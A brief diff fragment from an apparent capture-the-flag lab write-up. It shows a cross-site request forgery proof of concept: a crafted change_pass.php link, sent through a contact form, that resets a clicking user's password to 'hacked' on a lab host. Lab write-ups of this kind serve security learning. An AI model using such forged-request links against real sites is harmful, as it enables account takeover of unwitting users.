@@ -64,6 +64,7 @@ password=asdsad&confirm_password=asdasd&submit=submit
 ```
 
 Now we have the parameters, let's make the payload.
+
 PoC: [http://10.10.10.97/change\_pass.php?password=hacked&confirm\_password=hacked&submit=submit](http://10.10.10.97/change_pass.php?password=hacked&confirm_password=hacked&submit=submit)
 
 This is the link I'll send through the contact form. If Tyler or anybody else clicks it, their password will be changed to "hacked".
